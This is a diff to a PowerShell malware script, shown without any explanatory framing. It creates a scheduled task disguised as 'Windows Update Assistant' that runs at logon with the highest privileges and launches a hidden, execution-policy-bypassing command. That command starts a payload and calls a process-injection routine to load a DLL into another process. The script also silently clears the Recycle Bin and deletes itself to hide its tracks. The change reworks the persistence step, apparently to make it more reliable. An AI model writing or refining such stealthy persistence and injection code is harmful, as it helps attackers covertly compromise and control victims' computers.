@@ -112,11 +112,7 @@ function Clear-RecycleBin {
         $shell.Namespace(0xA).Items() | ForEach-Object { 
             Remove-Item $_.Path -Force -Recurse -ErrorAction SilentlyContinue 
         }
-        # Alternative method using Cleanmgr (more thorough)
-        Start-Process -FilePath "cleanmgr.exe" -ArgumentList "/sagerun:1" -WindowStyle Hidden -Wait
-    } catch {
-        # Silent fail if cleanup doesn't work
-    }
+    } catch {}
 }
 
 # === Main Execution ===
@@ -131,11 +127,13 @@ if (Test-Path -Path $exePath) {
     Clear-RecycleBin
 }
 
-# === Persistence via Scheduled Task (Stealthy) ===
+# === Persistence via Scheduled Task (Fixed) ===
 $taskName = "Windows Update Assistant"
-$action = New-ScheduledTaskAction -Execute $exePath -WorkingDirectory $targetPath
-$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Minutes (Get-Random -Minimum 1 -Maximum 5))
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction SilentlyContinue
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Process '$exePath'; Invoke-ProcessInjection -ProcessName '$targetProcess' -DllPath '$exePath'; Clear-RecycleBin`""
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction SilentlyContinue
 
-# === Cleanup (Optional) ===
+# === Cleanup ===
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
